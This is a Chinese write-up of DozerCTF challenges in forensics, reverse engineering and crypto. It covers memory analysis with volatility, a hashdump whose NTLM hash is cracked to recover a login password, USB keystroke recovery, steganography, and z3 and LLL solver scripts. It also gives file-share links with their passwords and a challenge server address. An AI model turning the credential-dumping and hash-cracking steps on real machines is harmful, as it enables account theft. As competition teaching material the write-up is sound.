G:volatility&gt;volatility.exe -f memory —profile=Win7SP1x64 filescan|findstr “flag”尝试查找带flag的文件发现一个analyse.zip文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01aff3dc481ffee9ef.jpg)

volatility.exe -f memory —profile=Win7SP1x64 dumpfiles -Q 0x000000001e85f430 —dump-dir=outdir导出文件，修改文件名

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0163fff14938d01118.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015e1910e7990d7f1e.jpg)

根据提示查找密码，猜测密码为用户登陆密码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e5d7f7601e578489.jpg)

使用volatility.exe -f memory —profile=Win7SP1x64 hashdump查看，解出NTLM

[![](https://p5.ssl.qhimg.com/t0105714a2e61f744e0.jpg)](https://p5.ssl.qhimg.com/t0105714a2e61f744e0.jpg)

[![](https://p3.ssl.qhimg.com/t0110d68cca372b8b31.jpg)](https://p3.ssl.qhimg.com/t0110d68cca372b8b31.jpg)

解压得到一个usb流量包，分析得

[![](https://p1.ssl.qhimg.com/t0183396fa6a1acff48.jpg)](https://p1.ssl.qhimg.com/t0183396fa6a1acff48.jpg)

[![](https://p4.ssl.qhimg.com/t019476876ac9f795e0.png)](https://p4.ssl.qhimg.com/t019476876ac9f795e0.png)

运行脚本得到键盘记录

AUTOKEY YLLTMFTNXBKGVCYYDBUHDLCPSPSPTSWRMWJJMNJGTYLKEGITTOIBGO

[![](https://p0.ssl.qhimg.com/t01e73e806e5a6df95d.jpg)](https://p0.ssl.qhimg.com/t01e73e806e5a6df95d.jpg)

对于自动密钥进行暴破

代码详见

[http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/](http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/)

[![](https://p1.ssl.qhimg.com/t01e5193450aa7d8282.jpg)](https://p1.ssl.qhimg.com/t01e5193450aa7d8282.jpg)

压缩包密码：thiskeyboardsucksforyou

得到的flag.txt是base64隐写

[![](https://p5.ssl.qhimg.com/t01cf71863fbdca12e4.jpg)](https://p5.ssl.qhimg.com/t01cf71863fbdca12e4.jpg)

运行脚本得到flag

[![](https://p0.ssl.qhimg.com/t016dd22d8fe20b6362.jpg)](https://p0.ssl.qhimg.com/t016dd22d8fe20b6362.jpg)

代码

```
def get_base64_diff_value(s1, s2):
  base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  res = 0
  for i in xrange(len(s2)):
    if s1[i] != s2[i]:
      return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))
  return res
def solve_stego():
  with open('flag.txt', 'rb') as f:
​    file_lines = f.readlines()
​    bin_str = ''
​    for line in file_lines:
​      steg_line = line.replace('n', '')
​      norm_line = line.replace('n', '').decode('base64').encode('base64').replace('n', '')
​      diff = get_base64_diff_value(steg_line, norm_line)
​      print diff
​      pads_num = steg_line.count('=')
​      if diff:
​        bin_str += bin(diff)[2:].zfill(pads_num * 2)
​      else:
​        bin_str += '0' * pads_num * 2
​      print goflag(bin_str)

def goflag(bin_str):
  res_str = ''
  for i in xrange(0, len(bin_str), 8):
​    res_str += chr(int(bin_str[i:i + 8], 2))
  return res_str





if __name__ == '__main__':
solve_stego()
flag：Dozerctf `{`itis_e4sy_4U2_analyse`}`
```

### <a class="reference-link" name="upload"></a>upload

发现上传的图片并导出

[![](https://p1.ssl.qhimg.com/t01d012c47df928325c.jpg)](https://p1.ssl.qhimg.com/t01d012c47df928325c.jpg)

[![](https://p5.ssl.qhimg.com/t015218ba7dfaafa40f.jpg)](https://p5.ssl.qhimg.com/t015218ba7dfaafa40f.jpg)

图片实际上是一个压缩包，改文件后缀名。

[![](https://p1.ssl.qhimg.com/t018295d1c1a0d0b3b6.jpg)](https://p1.ssl.qhimg.com/t018295d1c1a0d0b3b6.jpg)

根据压所文件大小猜测crc暴破

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ab55291838036acb.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c387dc7a684cf012.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01af91f14ca107c5f9.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019c0a43aa5477d1df.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013b6453d5d1e6e061.jpg)

flag：Dozerctf`{`can_U_find_thefilefrom_traffic`}`

### <a class="reference-link" name="py%E5%90%97%EF%BC%9F"></a>py吗？

修改图片高度

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013166dbd9e6411c6a.jpg)

lsb隐写

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0110eb4653270892bb.jpg)

导出的base64根据提示猜测为py或pyc文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01470c4b2f76300c6c.png)

将pyc文件反编译得到加密脚本

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01597546e0486c68ec.jpg)

写出对应揭秘脚本得到flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0181a8cd14cf418043.jpg)

flag：Dozerctf`{`python_is_the_best_language!`}`



## Re

### <a class="reference-link" name="%E8%B2%8C%E4%BC%BC%E6%9C%89%E4%BA%9B%E4%B8%8D%E5%AF%B9"></a>貌似有些不对

<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>**题目描述**

这是谁的课程设计？做的好烂！

<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**出题思路**

本题是替代签到题，IDA打开直接分析就可以，放了一个换表BASE64和一个栅栏，很简单。

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**解题思路**

如出题思路描述

### <a class="reference-link" name="eazy_crrakeMe"></a>eazy_crrakeMe

<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>**题目描述**

真·签到题(逆向)<br>
链接：[https://share.weiyun.com/1oUf2PdX](https://share.weiyun.com/1oUf2PdX) 密码：rhjr52

<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**出题思路**

本题是原本设定好的签到题，简单的MAC逆向，代码就是将输入进行加法法和异或运算，特别简单，主要考察的就是MAC的包结构。

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**解题思路**

本题解包得到程序文件，拖入IDA即可分析，本题主要是将输入内容先＋0x10然后^6，可以很容易写出解密程序

```
dir=[50,89,108,83,100,53,98,80,109,52,87,82,73,87,102,102,90,83,73,95,101,73,8
7,90,101,89,73,81,89,89,82,23,107]
flag=""
for i in dir:
    flag+=chr((i^6)-0x10)
print (flag)
```

### <a class="reference-link" name="easy_maze"></a>easy_maze

**<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>题目描述**

应该是比较容易的maze了吧！最终结果请以Dozerctf`{``}`格式提交。<br>
链接：[https://share.weiyun.com/muN58EuB](https://share.weiyun.com/muN58EuB) 密码：qbeb7n

<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**出题思路**

常规的迷宫已经不太好玩了，所以就要在迷宫实现的过程中添加一些有趣的东西，本题在迷宫行走的过程中，对于上下左右进行了有规律的交换，这样就可以增加迷宫的一些趣味（出题人并不知道这种思路的出题有人出过了没）

```
char direct[4] = `{` 'W','A','S','D' `}`;
void liftmv()
`{`
    char a = direct[0];
    direct[0] = direct[1];
    direct[1] = direct[2];
    direct[2] = direct[3];
    direct[3] = a;
`}`
void rightmv()
`{`
    char b = direct[3];
    direct[3] = direct[2];
    direct[2] = direct[1];
    direct[1] = direct[0];
    direct[0] = b;
`}`
void downmv()
`{`
    char a = direct[1];
    direct[1] = direct[3];
    direct[3] = a;
    char b = direct[0];
    direct[0] = direct[2];
    direct[2] = b;
`}`
void upmv()
`{`
    char b = direct[0];
    direct[0] = direct[2];
    direct[2] = b;
`}`
```

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**解题思路**

本题其实还是属于常规的迷宫，并不难，迷宫IDA即可dump出，然后可以先按照WASD的方向先走一遍，然后将路径按照规则进行置换就可以了。

```
#include &lt;iostream&gt;
#include &lt;string.h&gt;
#include &lt;cstdio&gt;
#include &lt;cmath&gt;
using namespace std;
char direct[4] = `{` 'W','A','S','D' `}`;
void liftmv()
`{`
    char a = direct[0];
    direct[0] = direct[1];
    direct[1] = direct[2];
    direct[2] = direct[3];
    direct[3] = a;
`}`
void rightmv()
`{`
    char b = direct[3];
    direct[3] = direct[2];
    direct[2] = direct[1];
    direct[1] = direct[0];
    direct[0] = b;
`}`
void downmv()
`{`
    char a = direct[1];
    direct[1] = direct[3];
    direct[3] = a;
    char b = direct[0];
    direct[0] = direct[2];
    direct[2] = b;
`}`
void upmv()
`{`
    char b = direct[0];
    direct[0] = direct[2];
    direct[2] = b;
`}`
char input[] = "SSSSDDDWWWDDSSSSSAAAASSDDDDSSSDDWWWWDDDSSSSD";
int main()
`{`
    for (int i = 0; i &lt; strlen(input); i++)
    `{`
        if (input[i] == 'W') `{`
            cout &lt;&lt; direct[0];
            upmv();
        `}`
        if (input[i] == 'A') `{`
            cout &lt;&lt; direct[1];
            liftmv();
        `}`
        if (input[i] == 'S') `{`
            cout &lt;&lt; direct[2];
            downmv();
        `}`
        if (input[i] == 'D') `{`
            cout &lt;&lt; direct[3];
            rightmv();
        `}`
    `}`
    return 0;
`}`
```

最后提交的flag按照md5提交，大小写都可以

### <a class="reference-link" name="dozer_vm_plus"></a>dozer_vm_plus

**<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>题目描述**

玩过Dozer淘汰赛的同学都知道……<br>
链接：[https://share.weiyun.com/Wvow0UTe](https://share.weiyun.com/Wvow0UTe) 密码：8jjj6q

<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**出题思路**

本题其实是校内CTF校队淘汰赛的原题，上次没有静态和去符号表，这次静态加去符号表，但是难度也不算很大，还是基础的异或和加减（在考虑撸了这套VM是不是也可以出VMpwn了）

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**解题思路**

本题出现了非预期解，这个思路是非常好的（而且出题人出题的时候没想到的），本题因为对于flag的每一个字符都进行单独验证和回显，所以可以直接采用爆破，这样这道题目的难度就基本为0了（不过头刚的可以按照正常的虚拟机分析）

```
PSH,80,
    PSH,123,
    PSH,102,
    PSH,113,
    PSH,94,
    PSH,79,
    PSH,96,
    PSH,114,
    PSH,103,
    PSH,80,
    PSH,123,
    PSH,102,
    PSH,113,
    PSH,94,
    PSH,75,
    PSH,66,
    PSH,89,
    PSH,75,
    PSH,117,
    PSH,95,
    PSH,75,
    PSH,95,
    PSH,123,
    PSH,75,
    PSH,113,
    PSH,109,
    PSH,95,
    PSH,101,
    PSH,45,
    PSH,105,
    SET,DR1,64,
    SET,DR2,30,
    CALL,WRITE,
    GET,DR1,0,
    GET,DR2,64,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,1,
    GET,DR2,65,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,2,
    GET,DR2,66,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,3,
    GET,DR2,67,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,4,
    GET,DR2,68,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,5,
    GET,DR2,69,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,6,
    GET,DR2,70,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,7,
    GET,DR2,71,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,8,
    GET,DR2,72,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,9,
    GET,DR2,73,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,10,
    GET,DR2,74,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,11,
    GET,DR2,75,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,12,
    GET,DR2,76,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,13,
    GET,DR2,77,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,14,
    GET,DR2,78,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,15,
    GET,DR2,79,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,16,
    GET,DR2,80,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,17,
    GET,DR2,81,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,18,
    GET,DR2,82,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,19,
    GET,DR2,83,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,20,
    GET,DR2,84,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,21,
    GET,DR2,85,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,22,
    GET,DR2,86,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,23,
    GET,DR2,87,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,24,
    GET,DR2,88,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,25,
    GET,DR2,89,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,26,
    GET,DR2,90,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,27,
    GET,DR2,91,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,28,
    GET,DR2,92,
    XOR,DR1,DR2,
    ERR,
    GET,DR1,29,
    GET,DR2,93,
    XOR,DR1,DR2,
    ERR,
    HLT
```

爆破脚本的话pwntools直接写就ok

### <a class="reference-link" name="easy_num"></a>easy_num

<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>**题目描述**

让我们快乐的解方程（可能出现多解，但是最终flag为有意义的文字）<br>
链接：[https://share.weiyun.com/C74pGrR2](https://share.weiyun.com/C74pGrR2) 密码：d8hd8q

<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**出题思路**

本题主要是因为看到了前段时间看雪CTF里面的一道题目，利用与非门实现的RSA，看完wp连喊了好几句wc，的确思路厉害，所以本题的所有运算基本上都是使用与和非来实现的，然后就是利用与非实现了所有的方程，大家愉快的解方程就可以了。

```
int nots(int x)`{`
    int data=~(x &amp; x);
    return data;
`}`
int ands(int x,int y)
`{`
    int data=~(~(x&amp;y));
    return data;
`}`
int xors(int x,int y)
`{`
    int a=~(x&amp;y);
    int b=~(~x&amp;~y);
    int c=~(a&amp;b);
    return ~c;
`}`
#define POPULATE_RIGHT(X) 
    X |= X &gt;&gt;1; 
    X |= X &gt;&gt;2; 
    X |= X &gt;&gt;4; 
    X |= X &gt;&gt;8; 
    X |= X &gt;&gt;16;
#define REPLICATE_LSB(X) 
    X |= X &lt;&lt;1; 
    X |= X &lt;&lt;2; 
    X |= X &lt;&lt;4; 
    X |= X &lt;&lt;8; 
    X |= X &lt;&lt;16;
#define SELECT(COND,A,B) ((COND) &amp; (A)) | (~(COND)&amp;(B))
int compare(uint32_t a,uint32_t b) `{`
    uint32_t diff = xors(a,b);
    POPULATE_RIGHT(diff);

    uint32_t greate = ands(a,xors(diff,diff&gt;&gt;1));
    POPULATE_RIGHT(greate);
    REPLICATE_LSB(greate);
    uint32_t non_zero = ands(diff,1);
    REPLICATE_LSB(non_zero);
    return SELECT(non_zero,SELECT(greate,1,-1),0);
`}`
int add(int num1,int num2)
`{`
    return num2?add(xors(num1,num2),ands(num1,num2)&lt;&lt;1):num1;
`}`
int sub(int a,int b)
`{`
    return add(a,add(nots(b),1));
`}`
int mul(int a,int b)
`{`
    int multiplicand = a&lt;0?add(nots(a),1):a;
    int multiplier = b&lt;0?add(nots(b),1):b;
    int product = 0;
    while(multiplier&gt;0)`{`
        if(ands(multiplier,0x1)&gt;0)`{`
            product=add(product,multiplicand);
        `}`
        multiplicand=multiplicand&lt;&lt;1;
        multiplier=multiplier&gt;&gt;1;
    `}`
    if(xors(a,b)&lt;0)`{`
        product=add(nots(product),1);
    `}`
    return product;
`}`
int divs(int dividend,int divisor)
`{`
    int flag=1;
    if(compare(xors(dividend,divisor),0))
        flag=0;
    int x = (dividend&lt;0) ? add(nots(dividend),1):dividend;
    int y = (divisor&lt;0) ? add(nots(divisor),1):divisor;
    int ans=0;
    int i=31;
   while(i&gt;=0)`{`
       if((x&gt;&gt;i)&gt;=y)`{`
           ans = add(ans,(i&lt;&lt;i));
           x=sub(x,(y&lt;&lt;i));
       `}`
       i=sub(i,1);
   `}`
   if(flag)`{`
       return add(nots(ans),1);
   `}`
   return ans;
`}`
```

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**解题思路**

其实在知道基础运算的实现之后，就可以很好的把方程给列出来，使用z3很容易就解出来的，这里使用AiDai师傅的wp

mips，利用ghidra反编译 qemu-mips运行，flag错误时输出wrong，根据wrong找到关键函数

输入flag，检测flag长度，flag长度应为0x18，然后8字节一组，每组运算后得到一个值，第一组uVar2, 第二组uVar5,第三组uVar3，根据后面的代码可以看出，这三个值应满足以下条件

```
(uVar2 * 4 + uVar5 * 3) - 0x13cc == uVar3
uVar2 * 9 + uVar5 + uVar3 * 6 == 0x3518
(uVar2 + uVar5) * 3 + uVar3 == 0x1759
```

使用z3求解

```
from z3 import *
s = Solver()
s.add((uVar2 * 4 + uVar5 * 3) - 0x13cc == uVar3)
s.add(uVar2 * 9 + uVar5 + uVar3 * 6 == 0x3518)
s.add((uVar2 + uVar5) * 3 + uVar3 == 0x1759)
print(s.check())
print(s.model())
#[uVar2 = 833, uVar3 = 871, uVar5 = 869]
```

接下来有一些对flag前八字节进行确定的代码，根据代码使用z3求解

```
x = BitVec('x',32)
y = BitVec('y',32)
s = Solver()
s.add((~(x &amp; y)) &amp; (x | y) == 0x15)
s.add(y==122)
print(s.check())
print(s.model())#o z
flag7 = BitVec('flag7',32)
s = Solver()
s.add((~(flag7 &amp; 0x44) &amp; (flag7 | 0x44)) == 0x22)
print(s.check())
print(s.model())#f
```

也可以直接根据flag格式得出前8字节为Dozerctf

```
if (flag8[4] != '_') goto gg2;
if (flag8[7] != '_') goto gg2;
if (flag16[2] != '_') goto gg2
```

这三行代码确定了下划线的位置 接下来调用了一个函数，这个函数需要返回0，跑一遍看看他什么时候返回0

```
#include&lt;stdio.h&gt;
unsigned int FUN_00400c94(unsigned int param_1,unsigned int param_2)
`{`
unsigned int uVar1;
unsigned int uVar2;
unsigned int uVar3;
uVar3 = ~(param_1 &amp; param_2) &amp; (param_1 | param_2);
uVar3 = uVar3 | uVar3 &gt;&gt; 1;
uVar3 = uVar3 | uVar3 &gt;&gt; 2;
uVar3 = uVar3 | uVar3 &gt;&gt; 4;
uVar3 = uVar3 | uVar3 &gt;&gt; 8;
uVar3 = uVar3 | uVar3 &gt;&gt; 0x10;
uVar2 = ~(uVar3 &amp; uVar3 &gt;&gt; 1) &amp; (uVar3 | uVar3 &gt;&gt; 1) &amp; param_1;
uVar2 = uVar2 | uVar2 &gt;&gt; 1;
uVar3 = uVar3 &amp; 1 | (uVar3 &amp; 1) &lt;&lt; 1;
uVar2 = uVar2 | uVar2 &gt;&gt; 2;
uVar2 = uVar2 | uVar2 &gt;&gt; 4;
uVar3 = uVar3 | uVar3 &lt;&lt; 2;
uVar2 = uVar2 | uVar2 &gt;&gt; 8;
uVar2 = uVar2 | uVar2 &gt;&gt; 0x10;
uVar3 = uVar3 | uVar3 &lt;&lt; 4;
uVar1 = uVar2 | uVar2 &lt;&lt; 1;
uVar1 = uVar1 | uVar1 &lt;&lt; 2;
uVar3 = uVar3 | uVar3 &lt;&lt; 8;
uVar1 = uVar1 | uVar1 &lt;&lt; 4;
uVar1 = uVar1 | uVar1 &lt;&lt; 8;
return (uVar2 &amp; 1 | ~(uVar1 | uVar1 &lt;&lt; 0x10)) &amp; (uVar3 | uVar3 &lt;&lt; 0x10);
`}`
int main(int argc, char const *argv[])`{`
for (unsigned int i = 0; i &lt; 0xff; ++i)`{`
for (unsigned int j = 0; j &lt; 0xff; ++j)`{`
if (FUN_00400c94(i,j)==0)`{`
printf("%d,",i);
printf("%dn",j);
`}`
`}`
`}`
`}`
```

当传入的两个参数相等时返回0，所以这个函数的功能是判断两个字节是否相等

```
flag_len = equal((int)flag8[6],(int)flag16[0]);
if (flag_len != 0) goto gg;
flag_len = equal((int)flag16[1],(int)flag16[4]);
if (flag_len != 0) goto gg;
flag_len = equal((int)flag16[4],(int)flag16[5]);
if (flag_len != 0) goto gg;
flag_len = equal((int)flag16[5],(char)flag[1]);
if (flag_len != 0) goto gg;
```

根据这段代码可以得到flag字节间的相等关系 接下来对flag两位进行判断，一共两次，第一次是

```
uVar2 = SEXT14(flag8[3]);
uVar5 = ~(int)flag8[1];
do `{`
uVar4 = uVar3 &amp; uVar5;
uVar5 = uVar3 | uVar5;
uVar3 = uVar4 &lt;&lt; 1;
uVar5 = ~uVar4 &amp; uVar5;
`}` while (uVar3 != 0);
while (uVar5 != 0) `{`
uVar3 = uVar2 &amp; uVar5;
uVar2 = uVar2 | uVar5;
uVar5 = uVar3 &lt;&lt; 1;
uVar2 = ~uVar3 &amp; uVar2;
`}`
if (uVar2 != 0xffffffff) goto gg;
```

这个uVar2 == 0xffffffff我跑不出来

```
uVar5 = SEXT14(flag8[2]);
uVar2 = SEXT14(flag8[0]);
if (uVar5 == 0) goto gg;
do `{`
uVar3 = uVar2 &amp; uVar5;
uVar2 = uVar2 | uVar5;
uVar5 = uVar3 &lt;&lt; 1;
uVar2 = ~uVar3 &amp; uVar2;
`}` while (uVar5 != 0);
if (uVar2 != 0xf0) goto gg;
```

通过爆破可以求解

```
for i in chars:
    uVar2 = ord('`{`')
    uVar5 = ord(i)
    while (uVar5 != 0):
        uVar3 = uVar2 &amp; uVar5
        uVar2 = uVar2 | uVar5
        uVar5 = (uVar3 &lt;&lt; 1)&amp;0xffffffff
        uVar2 = (~uVar3) &amp; uVar2
    if uVar2 == 0xf0:
        print(i)#u
```

接下来又给出两位

```
if (flag16[6] != 'd') goto gg;
if (flag16[3] != 'g') goto gg;
```

此时已经得到大部分flag

```
test = 'Dozerctf'
test2 = '`{`aua_as_'
test3 = 'so_good`}`'
```

其中a为位置位，根据flag是有意义字符串，可以猜测as是is，还剩两位，可以爆破

```
test2 = '`{`aua_is_'
for a in chars:
    print(a)
    for b in chars:
        test2 = '`{`'+a+'u'+b+'_'+'is_'
        uVar4 = 0
        uVar5 = 0
        for i in test2:
            uVar3 = ord(i)
            while (uVar3 != 0):
                uVar4 = uVar5 &amp; uVar3
                uVar5 = uVar5 | uVar3
                uVar3 = (uVar4 &lt;&lt; 1)&amp;0xffffffff
                uVar5 = (~uVar4) &amp; uVar5
            uVar3 = 0
        if uVar5 == 869:
            print(test2)
```

跑出来很多结果，根据flag是有意义字符串，判断应该是`{`num**is** 所以完整的flag应该是Dozerctf`{`num_is_so_good`}`，运行验证，输出correct



## Crypto

### <a class="reference-link" name="%E7%AD%BE%E5%88%B0"></a>签到

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**解题思路**

后缀名改txt，之后文本按照base64 32 16 58 解密即可拿到flag

### <a class="reference-link" name="eazy_bag"></a>eazy_bag

**<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>解题思路**

本题为2014 年 ASIS Cyber Security Contest Quals 中的 Archaic 原题，修改了flag文件，这里安装了sagemath环境后直接使用GitHub上面的脚本直接跑

```
import binascii
# open the public key and strip the spaces so we have a decent array
fileKey = open("pub.Key", 'rb')
pubKey = fileKey.read().replace(' ', '').replace('L', '').strip('[]').split(',')
nbit = len(pubKey)
# open the encoded message
fileEnc = open("enc.txt", 'rb')
encoded = fileEnc.read().replace('L', '')
print "start"
# create a large matrix of 0's (dimensions are public key length +1)
A = Matrix(ZZ, nbit + 1, nbit + 1)
# fill in the identity matrix
for i in xrange(nbit):
    A[i, i] = 1
# replace the bottom row with your public key
for i in xrange(nbit):
    A[i, nbit] = pubKey[i]
# last element is the encoded message
A[nbit, nbit] = -int(encoded)

res = A.LLL()
for i in range(0, nbit + 1):
    # print solution
    M = res.row(i).list()
    flag = True
    for m in M:
        if m != 0 and m != 1:
            flag = False
            break
    if flag:
        print i, M
        M = ''.join(str(j) for j in M)
        # remove the last bit
        M = M[:-1]
        M = hex(int(M, 2))[2:-1]
        print M
```

[https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic](https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic)

### <a class="reference-link" name="notfeal"></a>notfeal

基本上*ctf 2019原题（sixstar的师傅别来捶我）使用sixstar的脚本直接打好像没太大问题。

[https://github.com/sixstars/starctf2019/tree/master/crypto-notfeal](https://github.com/sixstars/starctf2019/tree/master/crypto-notfeal)



## Pwn

### <a class="reference-link" name="%E8%99%9A%E5%81%87%E7%9A%84pwn%E9%A2%98"></a>虚假的pwn题

**<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>题目描述**

这题目好虚假啊<br>
118.31.11.216:30009

